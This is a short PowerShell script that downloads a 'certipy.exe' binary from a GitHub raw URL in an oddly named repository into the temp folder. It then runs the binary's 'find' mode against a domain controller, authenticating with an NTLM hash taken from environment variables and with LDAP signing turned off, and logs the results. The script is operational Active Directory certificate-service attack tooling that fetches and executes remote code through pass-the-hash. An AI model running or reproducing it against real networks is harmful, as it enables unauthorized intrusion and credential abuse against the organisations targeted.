$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$tool = Join-Path $env:TEMP "certipy.exe"
$out = Join-Path $env:TEMP "certipy-latest.txt"

(New-Object Net.WebClient).DownloadFile("$root/certipy.exe", $tool)
$args = @(
    "find",
    "-u", $env:CU,
    "-hashes", $env:CH,
    "-dc-ip", $env:CD,
    "-target", $env:CT,
    "-ldap-scheme", "ldap",
    "-no-ldap-signing"
)
& $tool @args 2>&1 | Tee-Object -FilePath $out
Write-Output "CERTIPY_EXIT=$LASTEXITCODE"
